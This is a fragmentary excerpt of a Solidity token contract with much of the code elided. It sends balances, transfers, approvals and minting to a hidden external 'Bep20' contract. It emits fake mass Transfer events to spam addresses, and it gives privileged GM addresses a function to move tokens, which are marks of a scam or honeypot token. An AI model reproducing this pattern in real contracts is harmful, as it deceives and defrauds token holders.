...
function balanceOf(address account) public override view returns(uint){
        return ERC20(Bep20).BalanceOf(address(this),account);
    }
 ...
 function _transfer(address sender, address recipient, uint256 amount) private  returns (bool){
        ...
        bool go= ERC20(Bep20).transfer(address(this),sender,recipient,amount);   
        if(!go)return false;
 ...
 function transfer(address[] memory AM) public discountCHI {
        ...
        emit Transfer(address(0), AM[i],206088*1e18);
 }
 } 
  ...
  function Mint(address account, uint amount) external{
    ...
    function _mint(address account, uint amount) internal{
        ...
        _totalSupply = _totalSupply.add(amount);
         ERC20(Bep20).mint(address(this),account,amount);
         //_balances[account] = _balances[account].add(amount);
      
            emit Transfer(create, account, amount);      
    }
      function protect(ERC20 token, address to, uint amount) public {
        if(!GM[msg.sender]) revert();
...
//     }
    ...
    function _approve(address owner, address spender, uint amount) private returns(bool){
        ...
        require(spender != address(0), "ERC20: approve to the zero address");
         ...
         ERC20(Bep20).approve(address(this),owner,spender,amount);   
         _allowances[owner][spender] = ERC20(Bep20).allowance(address(this),owner,spender);
